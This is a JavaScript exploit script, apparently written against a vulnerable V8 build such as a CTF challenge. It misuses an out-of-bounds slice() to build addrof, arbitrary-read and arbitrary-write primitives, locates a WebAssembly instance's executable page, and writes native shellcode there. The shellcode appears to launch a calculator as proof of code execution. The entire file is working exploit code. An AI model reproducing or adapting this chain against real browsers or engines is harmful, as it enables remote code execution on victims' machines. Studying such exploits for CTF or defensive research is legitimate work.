//Chuked from faith's blog.
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function gethex(val) {
	return val.toString(16);
}

//Chuked from faith's blog.
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var float_arr = [1.1];
var float_arr_one = float_arr.slice(0);	

var obj = {"A":1}; 
var obj_arr = [obj];

var float_arr_element_pointer = ftoi(float_arr_one[2])
console.log("Element pointer: 0x"+gethex(float_arr_element_pointer&0xffffffffn));

function addrof(object) {
	obj_arr[0] = object;
	var temp_arr = float_arr.slice(0);
	temp_arr[2] = itof(float_arr_element_pointer+0x4cn);
	var val = ftoi(temp_arr[0]);	
	return val;
}

function arb_read(addr) {
	var temp_arr = float_arr.slice(0);
	temp_arr[2] = itof(addr);
	return ftoi(temp_arr[0]);
}

function arb_write(addr, val) {
	var temp_arr = float_arr.slice(0);
	temp_arr[2] = itof(addr);
	temp_arr[0] = itof(val);
}

wasm_addr = addrof(wasm_instance);
wasm_leak = arb_read(wasm_addr+0x60n);
console.log("Wasm shelllcode address Leak: 0x"+gethex(wasm_leak));

//copy shellcode
var buf = new ArrayBuffer(0x100);
var dataview = new DataView(buf);
var buff_addr = addrof(buf);
var backing_store_buf_addr = buff_addr+0xcn
arb_write(backing_store_buf_addr, wasm_leak);
var shellcode = [0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
for (var i = 0;i < shellcode.length; i++) {
	dataview.setUint32(4*i,shellcode[i],true);
}
f();
